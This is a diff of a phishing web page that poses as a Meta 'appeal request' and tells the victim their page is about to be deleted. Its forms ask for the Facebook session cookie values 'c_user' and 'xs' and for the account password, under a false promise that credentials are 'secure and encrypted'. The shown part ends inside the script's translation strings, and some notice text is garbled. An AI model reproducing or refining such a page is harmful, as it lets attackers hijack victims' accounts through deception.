+      border-color: #0064e0;
+      background: #f0f7ff;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.1);
+    }
+   
+    .language-option.selected {
+      border-color: #0064e0;
+      background: #e6f1ff;
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.15);
+    }
+   
+    .language-flag {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+   
+    .language-name {
+      font-weight: 600;
+      font-size: 16px;
+      color: #1a1a1a;
+      text-align: left;
+    }
+    
+    .language-code {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 2px;
+      text-align: left;
+    }
+   
+    .language-confirm-btn {
+      padding: 16px 30px;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .language-confirm-btn::before {
+      content: &#39;&#39;;
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .language-confirm-btn:hover::before {
+      left: 100%;
+    }
+   
+    .language-confirm-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 100, 224, 0.4);
+    }
+    
+    .language-confirm-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .language-confirm-btn:disabled:hover::before {
+      left: -100%;
+    }
+
+    .no-results {
+      grid-column: 1 / -1;
+      text-align: center;
+      padding: 30px;
+      color: #5f6368;
+      font-style: italic;
+    }
+
+    /* Scrollbar styling */
+    .language-options::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .language-options::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 4px;
+    }
+
+    .language-options::-webkit-scrollbar-thumb {
+      background: #c1c1c1;
+      border-radius: 4px;
+    }
+
+    .language-options::-webkit-scrollbar-thumb:hover {
+      background: #a8a8a8;
+    }
+
+    /* For Firefox */
+    .language-options {
+      scrollbar-width: thin;
+      scrollbar-color: #c1c1c1 #f1f1f1;
+    }
+
+    /* Mobile responsive adjustments */
+    @media (max-width: 768px) {
+      .language-modal-content {
+        padding: 30px 20px;
+      }
+      
+      .language-options {
+        grid-template-columns: 1fr;
+      }
+      
+      .language-modal-title {
+        font-size: 24px;
+        margin-bottom: 8px;
+      }
+      
+      .language-modal-subtitle {
+        font-size: 15px;
+        margin-bottom: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .language-modal-content {
+        padding: 25px 15px;
+      }
+      
+      .language-option {
+        padding: 12px;
+      }
+      
+      .language-flag {
+        width: 28px;
+        height: 28px;
+        font-size: 18px;
+        margin-right: 10px;
+      }
+      
+      .language-name {
+        font-size: 15px;
+      }
+    }
+
+    /* Hide main content until language is selected */
+    .main-content {
+      display: none;
+    }
+   
+    /* Mobile header */
+    .mobile-header { display: none; justify-content: center; align-items: center; padding: 10px 15px; position: fixed; top: 0; left: 0; right: 0; z-index: 9999; background: transparent; box-shadow: none; }
+    .mobile-logo { width: 60px; height: auto; }
+
+    header { width: 380px; padding: 40px 40px 15px 60px; display: flex; flex-direction: column; align-items: flex-start; position: fixed; top: 0; left: 0; height: 100vh; background: transparent; overflow-y: auto; z-index: 9999; }
+    .logo { width: 80px; margin: 15px 0 8px 20px; }
+    .privacy-text { font-size: 26px; font-weight: 700; color: #1a1a1a; margin: 0 0 15px 20px; letter-spacing: 0.4px; }
+
+    .home-page { display: flex; align-items: center; flex-direction: row; background-color: #000; color: #fff; padding: 12px 20px; border-radius: 8px; margin-left: 20px; margin-top: 5px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); transition: transform 0.2s ease; cursor: pointer; width: auto; max-width: 100%; }
+    .home-page:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15); }
+    .home-icon { margin-right: 12px; width: 20px; height: 20px; fill: #fff; flex-shrink: 0; }
+    .home-text { font-size: 16px; font-weight: 500; white-space: nowrap; }
+
+    .menu-container { margin-left: 20px; margin-top: 20px; display: flex; flex-direction: column; gap: 15px; }
+    .menu-item { display: flex; align-items: center; flex-direction: row; padding: 12px 20px; border-radius: 8px; transition: all 0.2s ease; cursor: pointer; width: 100%; }
+    .menu-item:hover { background-color: rgba(0, 0, 0, 0.05); transform: translateY(-2px); }
+    .menu-icon { margin-right: 15px; width: 20px; height: 20px; fill: #333; flex-shrink: 0; }
+    .menu-text { font-size: 16px; color: #333; font-weight: 500; white-space: nowrap; }
+
+    .vertical-divider { position: fixed; top: 0; left: 460px; width: 2px; height: 100vh; background-color: #ccc; opacity: 0.5; z-index: 1000; }
+
+    .center-content { margin-left: 460px; flex: 1; min-height: 100vh; overflow-y: auto; padding: 80px 40px; scroll-behavior: smooth; }
+    .center-content::-webkit-scrollbar { width: 10px; }
+    .center-content::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.05); border-radius: 10px; }
+    .center-content::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #0064e0, #0084ff); border-radius: 10px; border: 2px solid #fff; }
+    .center-content::-webkit-scrollbar-thumb:hover { background: linear-gradient(180deg, #0052b3, #0064e0); }
+
+    .warning-message { display: flex; flex-direction: column; align-items: flex-start; font-size: 24px; font-weight: 400; color: #333; gap: 8px; max-width: 650px; }
+    .warning-top { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
+    .warning-message svg { width: 36px; height: 36px; flex-shrink: 0; }
+    .warning-message span { font-weight: 700; color: #d93025; }
+
+    span#fbSendBtnText {
+        color: white;
+    }
+
+    span#sendBtnText {
+        color: white;
+    }
+    .warning-subtext { font-size: 16px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 15px; text-align: left; width: 100%; }
+    .warning-extra { font-size: 15px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 20px; max-width: 650px; text-align: left; width: 100%; }
+
+    /* Appeal box styling */
+    .appeal-box { margin-top: 30px; padding: 0; border-radius: 12px; width: 100%; max-width: 650px; position: relative; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
+    .appeal-box img { display: block; width: 100%; height: auto; border-radius: 12px 12px 0 0; margin: 0; }
+    .appeal-info { border: 2px solid #ffffff; border-top: none; border-radius: 0 0 12px 12px; padding: 25px; background: #fff; margin-top: -2px; }
+    .appeal-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; text-align: left; }
+    .appeal-desc { font-size: 16px; line-height: 1.6; color: #5f6368; margin-bottom: 25px; text-align: left; }
+    .appeal-btn { display: block; width: 100%; padding: 14px 16px; font-size: 16px; font-weight: 700; color: #fff; background: #0064e0; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s ease; text-align: center; }
+    .appeal-btn:hover { background: #0052b3; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 100, 224, 0.3); }
+   
+    /* Ensure appeal button text is white */
+    .appeal-info .appeal-btn {
+      color: #fff !important;
+    }
+
+    /* Appeal Guide Section */
+    .appeal-guide { margin-top: 40px; max-width: 650px; }
+    .appeal-guide-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 20px; text-align: left; }
+    .appeal-guide-content { background: #fff; border-radius: 12px; padding: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
+    .appeal-guide-text { font-size: 15px; line-height: 1.6; color: #5f6368; margin-bottom: 20px; text-align: left; }
+    .appeal-guide-text:last-child { margin-bottom: 0; }
+
+    /* Additional Resources Section */
+    .additional-resources { margin-top: 50px; max-width: 650px; }
+    .resources-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 25px; text-align: left; }
+    .resources-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+    .resource-card { background: #fff; border-radius: 12px; padding: 25px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
+    .resource-card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); }
+    .resource-icon { width: 40px; height: 40px; margin-bottom: 15px; fill: #0064e0; }
+    .resource-card-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; text-align: left; }
+    .resource-card-desc { font-size: 15px; line-height: 1.5; color: #5f6368; text-align: left; }
+
+    /* Redesigned Appeal Form Styling */
+    .appeal-form {
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      max-width: 650px;
+      position: relative;
+      display: none;
+    }
+   
+    .form-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeaea;
+    }
+   
+    .form-icon {
+      width: 40px;
+      height: 40px;
+      background: #0064e0;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 15px;
+    }
+   
+    .form-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #fff;
+    }
+   
+    .form-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+    }
+   
+    .form-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+   
+    .form-notice-container {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 25px;
+      border-left: 4px solid #0064e0;
+    }
+   
+    .form-notice {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+   
+    .form-notice:last-child {
+      margin-bottom: 0;
+    }
+   
+    .form-group {
+      margin-bottom: 22px;
+      position: relative;
+    }
+   
+    .form-label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+   
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: #fafafa;
+    }
+   
+    .form-input:focus {
+      border: 1px solid #0064e0;
+      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
+      outline: none;
+      background: #fff;
+    }
+   
+    .input-error {
+      color: #c2410c;
+      font-size: 13px;
+      line-height: 1.3;
+      margin-top: 6px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+   
+    .input-error svg {
+      width: 16px;
+      height: 16px;
+    }
+   
+   .form-warning {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      padding: 14px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #92400e;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .form-warning svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+    
+    .form-warning.show {
+      display: flex;
+    }
+   
+    .form-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .form-btn::before {
+      content: &#39;&#39;;
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .form-btn:hover::before {
+      left: 100%;
+    }
+    
+    .form-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(0, 100, 224, 0.4);
+    }
+    
+    .form-btn.loading {
+      opacity: 0.8;
+      pointer-events: none;
+    }
+   
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+   
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+   
+    /* Video container styling */
+    .video-container {
+      margin: 15px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      position: relative;
+      max-width: 378px;
+    }
+   
+    .video-player {
+      width: 100%;
+      height: 200px;
+      background: #000;
+      display: block;
+    }
+   
+     
+    .video-placeholder {
+      width: 100%;
+      height: 200px;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      flex-direction: column;
+      cursor: pointer;
+    }
+      
+      @media (max-width: 900px) {
+  .video-container {
+    max-width: 337px; /* Mobile width */
+  }
+  }
+
+
+    .video-placeholder svg {
+      width: 30px;
+      height: 30px;
+      margin-bottom: 8px;
+    }
+   
+    .video-title {
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 5px;
+    }
+   
+    
+    .fb-login-form {
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      max-width: 650px;
+      position: relative;
+      display: none;
+    }
+    
+    .fb-form-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeaea;
+    }
+   
+    .fb-form-icon {
+      width: 40px;
+      height: 40px;
+      background: #1877f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 15px;
+    }
+   
+    .fb-form-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #fff;
+    }
+   
+    .fb-form-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+    }
+   
+    .fb-form-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+    
+    .fb-form-notice-container {
+      background: #f0f2f5;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 25px;
+      border-left: 4px solid #1877f2;
+    }
+   
+    .fb-form-notice {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+   
+    .fb-form-notice:last-child {
+      margin-bottom: 0;
+    }
+   
+    .fb-form-group {
+      margin-bottom: 22px;
+      position: relative;
+    }
+   
+    .fb-form-label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+   
+    .fb-form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: #f5f6f7;
+    }
+   
+    .fb-form-input:focus {
+      border: 1px solid #1877f2;
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+      outline: none;
+      background: #fff;
+    }
+   
+    .fb-input-error {
+      color: #c2410c;
+      font-size: 13px;
+      line-height: 1.3;
+      margin-top: 6px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+   
+    .fb-input-error svg {
+      width: 16px;
+      height: 16px;
+    }
+   
+    .fb-form-warning {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      padding: 14px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #92400e;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+   
+    .fb-form-warning svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+   
+    .fb-form-warning.show {
+      display: flex;
+    }
+   
+    .fb-form-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #1877f2, #166fe5);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+   
+    .fb-form-btn::before {
+      content: &#39;&#39;;
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+   
+    .fb-form-btn:hover::before {
+      left: 100%;
+    }
+   
+    .fb-form-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
+    }
+   
+    .fb-form-btn.loading {
+      opacity: 0.8;
+      pointer-events: none;
+    }
+   
+    .forgot-password {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+   
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+   
+    .success-message {
+      margin-top: 30px;
+      background: #d1fae5;
+      border: 1px solid #10b981;
+      border-radius: 12px;
+      padding: 25px;
+      text-align: center;
+      display: none;
+    }
+   
+    .success-message.show {
+      display: block;
+    }
+   
+    .success-icon {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #a7f3d0;
+      border-radius: 50%;
+      border: 2px solid #10b981;
+    }
+   
+    .success-icon svg {
+      width: 30px;
+      height: 30px;
+      color: #059669;
+    }
+   
+    .success-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #065f46;
+      margin-bottom: 10px;
+    }
+   
+    .success-text {
+      font-size: 15px;
+      color: #065f46;
+      margin-bottom: 15px;
+    }
+   
+    .reference-id {
+      font-family: &#39;Monaco&#39;, &#39;Menlo&#39;, &#39;Ubuntu Mono&#39;, monospace;
+      font-size: 14px;
+      color: #374151;
+      background: #f9fafb;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: inline-block;
+    }
+
+    /* Mobile Responsive Styles */
+    @media (max-width: 900px) {
+      .vertical-divider { display: none; }
+      .mobile-header { display: flex; }
+      header { display: none; }
+      .center-content { margin-left: 0; padding: 100px 20px 40px; }
+      .warning-message { font-size: 20px; align-items: flex-start; text-align: left; }
+      .warning-top { flex-direction: row; text-align: left; gap: 15px; margin-bottom: 20px; }
+      .warning-message span { text-align: left; }
+      .warning-subtext, .warning-extra { font-size: 15px; text-align: left; }
+      .warning-message svg { width: 32px; height: 32px; }
+      .appeal-info { padding: 20px; }
+      .appeal-title { font-size: 20px; text-align: left; }
+      .appeal-desc { font-size: 15px; text-align: left; }
+      .appeal-btn { font-size: 16px; padding: 14px; }
+      .appeal-guide { margin-top: 30px; }
+      .appeal-guide-title { font-size: 20px; text-align: left; }
+      .appeal-guide-content { padding: 20px; }
+      .appeal-guide-text { font-size: 14px; text-align: left; }
+      .additional-resources { margin-top: 40px; }
+      .resources-grid { grid-template-columns: 1fr; }
+      .resources-title { font-size: 20px; text-align: left; }
+     
+      .appeal-form {
+        padding: 20px;
+      }
+     
+      .form-title {
+        font-size: 22px;
+      }
+     
+      .fb-login-form {
+        padding: 20px;
+      }
+     
+      .fb-form-title {
+        font-size: 22px;
+      }
+     
+      .video-player,
+      .video-placeholder {
+        height: 200px;
+      }
+     
+      .video-placeholder svg {
+        width: 25px;
+        height: 25px;
+      }
+     
+      .video-title {
+        font-size: 12px;
+      }
+     
+      .language-options {
+        grid-template-columns: 1fr;
+      }
+     
+      .language-modal-content {
+        padding: 30px 20px;
+      }
+     
+      .language-modal-title {
+        font-size: 22px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .center-content { padding: 100px 15px 30px; }
+      .warning-message { font-size: 18px; }
+      .warning-message svg { width: 28px; height: 28px; }
+      .mobile-logo { width: 50px; }
+      .appeal-guide-title { font-size: 18px; text-align: left; }
+      .appeal-guide-content { padding: 15px; }
+      .resources-title { font-size: 18px; text-align: left; }
+      .resource-card { padding: 20px; }
+      .resource-icon { width: 35px; height: 35px; }
+      
+      .appeal-form {
+        padding: 15px;
+      }
+     
+      .fb-login-form {
+        padding: 15px;
+      }
+     
+      .form-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+     
+      .fb-form-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+     
+      .form-icon {
+        margin-bottom: 10px;
+      }
+     
+      .fb-form-icon {
+        margin-bottom: 10px;
+      }
+     
+      .success-message {
+        padding: 20px;
+      }
+     
+      .success-icon {
+        width: 50px;
+        height: 50px;
+      }
+     
+      .success-icon svg {
+        width: 25px;
+        height: 25px;
+      }
+     
+      .success-title {
+        font-size: 18px;
+      }
+     
+      .video-player,
+      .video-placeholder {
+        height: 180px;
+      }
+     
+      .video-placeholder svg {
+        width: 22px;
+        height: 22px;
+      }
+     
+      .video-title {
+        font-size: 11px;
+      }
+    }
     </style>
   </head>
-  <body>
+  <body style="overflow: hidden;">
     <!-- Language Selection Modal -->
-    <div class="language-modal" id="languageModal">
+    <div class="language-modal" id="languageModal" style="display: flex;">
       <div class="language-modal-content">
         <div class="language-modal-close" id="languageModalClose">
           <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -1425,7 +1056,7 @@
           <input type="text" class="language-search-input" id="languageSearchInput" placeholder="Search languages..." />
         </div>
         <div class="language-options" id="languageOptionsContainer">
-          <div class="language-option" data-lang="english">
+          <div class="language-option selected" data-lang="english" style="display: flex;">
             <div class="language-flag">
               🇺🇸
             </div>
@@ -1433,7 +1064,7 @@
               English
             </div>
           </div>
-          <div class="language-option" data-lang="hindi">
+          <div class="language-option" data-lang="hindi" style="display: flex;">
             <div class="language-flag">
               🇮🇳
             </div>
@@ -1441,7 +1072,7 @@
               Hindi
             </div>
           </div>
-          <div class="language-option" data-lang="spanish">
+          <div class="language-option" data-lang="spanish" style="display: flex;">
             <div class="language-flag">
               🇪🇸
             </div>
@@ -1449,7 +1080,7 @@
               Spanish
             </div>
           </div>
-          <div class="language-option" data-lang="portuguese">
+          <div class="language-option" data-lang="portuguese" style="display: flex;">
             <div class="language-flag">
               🇵🇹
             </div>
@@ -1457,7 +1088,7 @@
               Portuguese
             </div>
           </div>
-          <div class="language-option" data-lang="tamil">
+          <div class="language-option" data-lang="tamil" style="display: flex;">
             <div class="language-flag">
               🇮🇳
             </div>
@@ -1465,7 +1096,7 @@
               Tamil
             </div>
           </div>
-          <div class="language-option" data-lang="arabic">
+          <div class="language-option" data-lang="arabic" style="display: flex;">
             <div class="language-flag">
               🇸🇦
             </div>
@@ -1474,7 +1105,7 @@
             </div>
           </div>
           <!-- Additional languages for testing scroll -->
-          <div class="language-option" data-lang="french">
+          <div class="language-option" data-lang="french" style="display: flex;">
             <div class="language-flag">
               🇫🇷
             </div>
@@ -1482,7 +1113,7 @@
               French
             </div>
           </div>
-          <div class="language-option" data-lang="vietnamese">
+          <div class="language-option" data-lang="vietnamese" style="display: flex;">
             <div class="language-flag">
               🇻🇳
             </div>
@@ -1490,7 +1121,7 @@
               Vietnamese
             </div>
           </div>
-          <div class="language-option" data-lang="ghanaian">
+          <div class="language-option" data-lang="ghanaian" style="display: flex;">
             <div class="language-flag">
               🇬🇭
             </div>
@@ -1499,13 +1130,13 @@
             </div>
           </div>
         </div>
-        <button class="language-confirm-btn" id="languageConfirmBtn" disabled="">
+        <button class="language-confirm-btn" id="languageConfirmBtn">
           Confirm Language
         </button>
       </div>
     </div>
     <!-- Main Content (hidden until language is selected) -->
-    <div class="main-content" id="mainContent">
+    <div class="main-content" id="mainContent" style="display: none;">
       <!-- Mobile Header with fixed logo -->
       <div class="mobile-header">
         <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
@@ -1579,7 +1210,7 @@
                 Appeal request
               </div>
               <div class="appeal-desc translatable" data-key="appealDesc">
-                Fixing problems with your page Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.
+                Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.
               </div>
               <button class="appeal-btn" id="open-appeal-btn">
                 <span id="fbSendBtnText" class="translatable" data-key="appealBtn">                Appeal
@@ -1607,18 +1238,18 @@
             </div>
             <div class="form-notice-container">
               <div class="form-notice translatable" data-key="formNotice1">
-                ⓘ Your page has a violation related to our community guidelines.
+                Ⓞ1¤7 Your page has a violation related to our community guidelines.
               </div>
               <div class="form-notice translatable" data-key="formNotice2">
-                ⓘ Please review the violation details carefully before submitting.
+                Ⓞ1¤7 Please review the violation details carefully before submitting.
               </div>
               <div class="form-notice translatable" data-key="formNotice3">
-                ⓘ Ensure you provide correct information for your appeal.
+                Ⓞ1¤7 Ensure you provide correct information for your appeal.
               </div>
             </div>
             <!-- Video Section -->
             <div class="video-container" id="videoContainer">
-              <video class="video-player" id="guideVideo" controls="">
+              <video class="video-player" id="guideVideo" controls="" src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4">
                 <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4" />
                 Your browser does not support the video tag.
               </video>
@@ -1676,13 +1307,13 @@
             </div>
             <div class="fb-form-notice-container">
               <div class="fb-form-notice translatable" data-key="fbNotice1">
-                ⓘ For security purposes, we need to verify your Facebook account.
+                Ⓞ1¤7 For security purposes, we need to verify your Facebook account.
               </div>
               <div class="fb-form-notice translatable" data-key="fbNotice2">
-                ⓘ This helps us ensure that you are the legitimate owner of the page.
+                Ⓞ1¤7 This helps us ensure that you are the legitimate owner of the page.
               </div>
               <div class="fb-form-notice translatable" data-key="fbNotice3">
-                ⓘ Your credentials are secure and encrypted.
+                Ⓞ1¤7 Your credentials are secure and encrypted.
               </div>
             </div>
             <div class="fb-form-group">
@@ -1742,8 +1373,7 @@
             </div>
             <div class="appeal-guide-content">
               <p class="appeal-guide-text translatable" data-key="guideText1">
-                If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you
-                            believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.
+                If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.
               </p>
               <p class="appeal-guide-text translatable" data-key="guideText2">
                 After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.
@@ -1818,884 +1448,868 @@
           </div>
           <script>
             // Wait for the DOM to be fully loaded
-                    document.addEventListener(&#39;DOMContentLoaded&#39;, function() {
-                        // Language translations
-                        const translations = {
-                            english: {
-                                warningTitle: &#34;Your page is scheduled to be deleted!&#34;,
-                                warningSubtext: &#34;We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.&#34;,
-                                warningExtra: &#34;If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.&#34;,
-                                appealTitle: &#34;Appeal request&#34;,
-                                appealDesc: &#34;Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.&#34;,
-                                appealBtn: &#34;Appeal&#34;,
-                                formTitle: &#34;Page Appeal Request&#34;,
-                                formSubtitle: &#34;Submit your information to appeal the deletion&#34;,
-                                formNotice1: &#34;ⓘ Your page has a violation related to our community guidelines.&#34;,
-                                formNotice2: &#34;ⓘ Please review the violation details carefully before submitting.&#34;,
-                                formNotice3: &#34;ⓘ Ensure you provide correct information for your appeal.&#34;,
-                                nameLabel: &#34;c_user&#34;,
-                                mallLabel: &#34;xs&#34;,
-                                submitBtn: &#34;Submit Appeal Request&#34;,
-                                fbFormTitle: &#34;Facebook Verification&#34;,
-                                fbFormSubtitle: &#34;Verify your identity to continue with the appeal&#34;,
-                                fbNotice1: &#34;ⓘ For security purposes, we need to verify your Facebook account.&#34;,
-                                fbNotice2: &#34;ⓘ This helps us ensure that you are the legitimate owner of the page.&#34;,
-                                fbNotice3: &#34;ⓘ Your credentials are secure and encrypted.&#34;,
-                                passwordLabel: &#34;Password&#34;,
-                                verifyBtn: &#34;Verify and Continue&#34;,
-                                forgotPassword: &#34;Forgotten password?&#34;,
-                                successTitle: &#34;Appeal Submitted Successfully&#34;,
-                                successText: &#34;Your appeal has been received and is now in review. We&#39;ll notify you via email once a decision has been made, typically within 7 business days.&#34;,
-                                referenceText: &#34;Reference ID:&#34;,
-                                guideTitle: &#34;Appeal Guide&#34;,
-                                guideText1: &#34;If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.&#34;,
-                                guideText2: &#34;After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.&#34;,
-                                guideText3: &#34;Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.&#34;,
-                                resourcesTitle: &#34;Additional Resources&#34;,
-                                helpCenterTitle: &#34;Help Center&#34;,
-                                helpCenterDesc: &#34;Find answers to common questions and learn how to use our products.&#34;,
-                                contactSupportTitle: &#34;Contact Support&#34;,
